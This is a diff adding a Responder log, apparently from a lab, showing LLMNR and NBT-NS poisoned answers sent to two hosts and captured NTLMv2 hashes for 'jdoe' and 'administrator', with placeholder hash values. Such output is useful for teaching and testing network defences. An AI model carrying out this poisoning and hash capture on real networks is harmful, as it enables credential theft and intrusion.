@@ -1,0 +1,20 @@
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder
+
+[+] Listening for events...
+
+[*] [LLMNR] Poisoned answer sent to 192.168.56.105 for name fileserver
+[SMB] NTLMv2-SSP Client   : 192.168.56.105
+[SMB] NTLMv2-SSP Username : LAB\jdoe
+[SMB] NTLMv2-SSP Hash     : jdoe::LAB:1122334455667788:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:0101000000000000FAKEFAKEFAKE0000
+[*] Skipping previously captured hash for LAB\jdoe
+[*] [NBT-NS] Poisoned answer sent to 192.168.56.107 for name INTRANET
+[HTTP] NTLMv2 Client   : 192.168.56.107
+[HTTP] NTLMv2 Username : LAB\administrator
+[HTTP] NTLMv2 Hash     : administrator::LAB:99887766554433221:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB:0101000000000000FAKEFAKEFAKE1111
+[+] Exiting...
